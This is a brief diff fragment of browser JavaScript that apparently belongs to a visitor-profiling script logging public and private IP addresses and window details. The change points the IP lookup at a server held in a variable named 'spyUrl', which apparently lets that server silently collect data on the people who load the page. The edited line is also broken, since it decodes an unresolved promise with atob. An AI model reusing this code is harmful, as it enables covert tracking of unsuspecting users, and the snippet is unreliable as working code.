@@ -101,8 +101,8 @@ script2 = atob(y);
   }
 }, 1000);
 async function getIP(){
-let x = await fetch("https://api.ipify.org");
-let y = await x.text();
+let x = await fetch(spyUrl + "getIP");
+let y = await atob(x.text());
 appendLog("Public IP: " + y + "<br> Private IP: " + privateIP);
 }
 function getWindowInfo() {
